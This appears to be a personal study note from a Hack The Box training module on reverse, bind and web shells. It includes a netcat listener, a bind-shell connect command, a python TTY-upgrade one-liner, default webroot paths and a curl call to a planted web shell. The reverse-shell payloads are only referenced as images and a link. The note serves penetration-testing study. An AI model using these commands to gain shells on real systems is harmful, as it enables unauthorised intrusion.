https://academy.hackthebox.com/module/77/section/725
#TO-DO #WIP [[2Nibbles - Web Footprinting]]

|Type of Shell|Method of Communication|
|---|---|
|`Reverse Shell`|Connects back to our system and gives us control through a reverse connection.|
|`Bind Shell`|Waits for us to connect to it and gives us control once we do.|
|`Web Shell`|Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.|

# Reverse shell
 #tool #Payload_All_the_Things 
 [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#netcat #listener
```pug
nc -lvnp 1234
```

|Flag|Description|
|---|---|
|`-l`|Listen mode, to wait for a connection to connect to us.|
|`-v`|Verbose mode, so that we know when we receive a connection.|
|`-n`|Disable DNS resolution and only connect from/to IPs, to speed up the connection.|
|`-p 1234`|Port number `netcat` is listening on, and the reverse connection should be sent to.|
Examples: (From Payload ATT)
![[Pasted image 20240429155342.png]]

# Bind Shell
Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.
Example: (From Payload ATT)
![[Pasted image 20240429155504.png]]
## Connecting
```pug
nc 10.10.10.1 1234
```

# Upgrading TTY
#TTY 

```pug
python -c 'import pty; pty.spawn("/bin/bash")'
```

Adjusting:
![[Pasted image 20240429155645.png]]

# Web Shell
#webapps #whatweb 
![[Pasted image 20240429155714.png]]

Default webroots:
#webroots

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\|   |
| `XAMPP`    | C:\xampp\htdocs\|      |
## Accessing Web Shell
#tool  #cURL 

```pug
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
